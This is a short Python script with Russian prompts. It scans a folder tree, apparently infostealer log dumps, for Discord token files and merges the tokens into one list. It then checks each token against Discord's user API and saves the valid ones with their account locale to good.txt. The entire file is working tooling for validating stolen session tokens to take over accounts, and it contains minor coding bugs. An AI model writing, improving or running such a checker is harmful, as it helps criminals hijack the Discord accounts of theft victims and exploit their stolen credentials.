import os
import os.path
import asyncio, aiohttp

discord = 0

path = input("Путь к основной папке: ")

async def _discordCheck(session, token):
    global discord
    headers = {
        'authorization' : token
    }
    url = "https://discordapp.com/api/v7/users/@me"
    try:
        async with session.get(url=url, headers=headers) as res:
            res = await res.json()
            if 'message' not in res.keys():
                with open('good.txt', 'a') as f:
                    f.write("token: " + token + '\n' +"locale: " + res['locale'] + '\n\n')   
                discord += 1
            else:
                if "401" not in res['message']:
                    with open('errors.txt', 'a') as a:
                        a.write(token + '\n' + res + '\n\n')
    except:
        pass

async def _discord():
    global path

    passfiles = []
    good = 0

    for address, dirs, files in os.walk(path):
        for dir in dirs:
            if "iscord" in dir:
                passfiles.append(os.path.join(address, dir))

    for file in passfiles:
        try:
            with open(file + '\\Tokens.txt', 'r') as f:
                for line in f.read().split('\n'):
                    with open('tokens.txt', 'a') as w:
                        w.write(line + '\n')
                        good += 1
        except:
            try:
                with open(file + '\\discord_tokens.txt', 'r') as f:
                    for line in f.read().split('\n'):
                        with open('tokens.txt', 'a') as w:
                            l = line.split(' ')
                            if len(l) != 2:
                                pass
                            w.write(l[2] + '\n')
                            good += 1
            except:
                pass
    good_tokens = []
    all = []
    with open('tokens.txt', 'r') as f:
        for i in f.read().split('\n'):
            if i != '':
                all.append(i)
    for i in all:
        if i not in good_tokens:
            good_tokens.append(i)
    print('Found: %s Discords' % len(good_tokens))
    with open('tokens.txt', 'w') as t:
        t.write('')
    with open('tokens.txt', 'a') as t:
        for i in good_tokens:
            t.write(i + '\n')
    
    print('Приступаю к чеку')
    tokens = []
    
    with open('tokens.txt', 'r') as f:
            for i in f.read().split('\n'):
                if i != '':
                    tokens.append(i)

    async with aiohttp.ClientSession() as session:
        tasks = []
        for token in tokens:
            task = asyncio.create_task(_discordCheck(session, token))
            tasks.append(task)

        await asyncio.gather(*tasks)
    os.remove('tokens.txt')
    print('Good: %s'%discord)


asyncio.run(_discord())
